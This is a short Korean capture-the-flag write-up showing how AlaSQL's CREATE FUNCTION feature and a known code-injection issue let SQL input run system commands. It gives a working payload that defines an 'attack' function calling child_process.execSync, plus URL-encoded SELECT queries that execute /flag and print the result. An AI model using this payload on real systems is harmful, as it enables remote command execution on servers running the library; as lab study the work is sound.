참고했던 사이트
- [\[ Code Injection Vulnerability During Processing Literal \]](https://github.com/AlaSQL/alasql/issues/1302)
- [\[ AlaSQL CREATE FUNCTION \]](https://github.com/AlaSQL/alasql/wiki/User-Defined-Functions)
- [\[ AlaSQL document \]](https://github.com/AlaSQL/alasql)



AlaSQL CREATE FUNCTION 자료를 확인해보면 아래 구문이 있습니다.
함수를 생성하는 기능입니다.
`CREATE FUNCTION cubic AS ``function(x) { return x*x*x; }``;`


그리고, Code Injection Vulnerability During Processing Literal 자료를 확인해보면 아래 코드가 있습니다.
Code Injection을 가능하게 해주는 함수 예제입니다.
`new Function(
    'return this.process.mainModule.require'
)()('child_process').execSync(${JSON.stringify(command)})
`;`

여기서 생각한게, 아래의 내용이 들어간 함수를 생성하고, 
`process.mainModule.require("child_process").execSync(exploit_code);`

select문으로 '/flag' 인자를 넘겨주면 실행이 될까? 하는 궁금증에 테스트를 해봤습니다.
아래는 함수를 생성한 exploit 함수를 생성한 코드입니다.
`CREATE FUNCTION attack AS ``function(exploit_code) { return process.mainModule.require("child_process").execSync(exploit_code); }``;`


그리고 아래 SELECT문으로 함수를 실행시켰습니다.
`select%20attack("/flag");`

Buffer Type의 data가 아래와 같이 출력되었습니다.
![스크린샷 2022-10-10 오후 8.14.46.png](https://kr.object.ncloudstorage.com/dreamhack-content/attachments/48d8bf0b3e99e160dff64cf27cc79188e6a24b6b694318e7a0a6057afaca5a10.png)

마지막으로 toString()함수로 출력시키면 됩니다.
`select%20attack("/flag").toString();`
